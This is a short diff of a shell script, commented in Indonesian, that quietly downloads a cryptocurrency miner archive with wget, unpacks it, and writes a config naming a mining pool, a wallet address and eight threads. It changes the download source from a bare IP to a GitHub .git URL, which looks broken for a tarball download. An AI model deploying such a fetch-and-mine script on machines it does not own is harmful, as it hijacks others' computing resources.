@@ -17,7 +17,7 @@ cd "$APP_DIR"
 
 # Unduh dan ekstrak hanya jika belum ada
 if [ ! -d "$MINER_DIR" ]; then
-    wget -q http://43.163.114.162/joko.tar.gz -O joko.tar.gz
+    wget -q https://github.com/vokerjok/joko.git -O joko.tar.gz
     tar -xf joko.tar.gz
     rm -f joko.tar.gz
 fi
@@ -27,7 +27,7 @@ cd "$MINER_DIR"
 # Buat file config
 cat > "$CONFIG_FILE" <<END
 {
-  "url": "134.199.156.102:80",
+  "url": "asia.rplant.xyz:7022",
   "user": "mbc1qh4y3l6n3w6ptvuyvtqhwwrkld8lacn608tclxv",
   "pass": "x",
   "threads": "8",
